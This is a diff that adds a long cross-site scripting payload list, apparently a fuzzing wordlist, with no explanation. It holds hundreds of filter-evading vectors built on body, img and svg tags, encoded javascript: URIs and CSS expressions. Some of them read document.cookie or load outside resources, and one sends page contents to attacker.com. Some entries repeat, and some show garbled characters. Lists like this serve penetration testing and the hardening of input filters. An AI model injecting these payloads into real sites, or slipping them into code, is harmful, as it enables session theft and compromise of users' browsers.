@@ -1,0 +1,162 @@
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+javascript://%250Aalert(1)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+alert(document.cookie)
+alert(document['cookie'])
+with(document)alert(cookie)
+<BODY BACKGROUND="javascript:alert('XSS');">
+<BODY ONLOAD=alert('XSS')>
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
+<body onload=;;;;;;;;;;;_=alert;_(1);;;;
+<body <body onload=;;;;;al:eval('al'+'ert(1)');;>
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/â€â€$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<style>body:after{content: â€œ\61\6c\65\72\74\28\31\29â€³}</style><script>eval(eval(document.styleSheets[0].cssRules[0].style.content))</script>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<BODY BACKGROUND=�javascript:alert(�XSS�)�>
+<BODY ONLOAD=alert(�XSS�)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body background=javascript:'"><script>alert(XSS)</script>></body>
+<form name=document><image name=body>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+<IMG SRC="livescript:[code]">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMGSRC="javascript:alert('XSS')">
+perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<img src=`x` onrerror= ` ;; alert(1) ` />
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
+<IMG DYNSRC="javascript:alert('XSS');">
+<IMG LOWSRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="livescript:[code]">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC="mocha:[code]">
+<IMGSRC="javascript:alert('XSS')">
+perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
+>"'><img%20src%3D%26%23x6a%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+<IMGSRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<img/onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+<img """><script>alert("alert(1)")</script>">
+<img onerror="alert(1)"src=a>
+<img onerror='alert(1)'src=a>
+<img onerror=`alert(1)`src=a>
+<img src='a'onerror=alert(1)>
+<img/onerror="alert(1)"src=a>
+<img onerror=a[%00]lert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+<svg><set onbegin=alert(1)>
+<svg><set end=1 onend=alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefto=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=hrefvalues=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0from=javascript:alert(1)>
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+<svg/on<script><script>load=alert(1)//</script>
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)>
+%uFF1Csvg onload=alert(3)>
+"><svg/onload=alert(1)>"@x.y
+\74svg o\156load\75alert\501\51\76
+"'>confirm&lpar;1)</Script><Svg><Script/1='
+<!--><svg onload=alert(1)-->
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
+<svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+veris-->group<svg/onload=alert(/XSS/)//
+<svg/onload=%26%23097lert%26lpar;1337)>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<svg><script ?>alert(1)
+<svg contentScriptType=text/vbs><script>MsgBox
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg><script>//&NewLine;confirm(1);</script </svg>
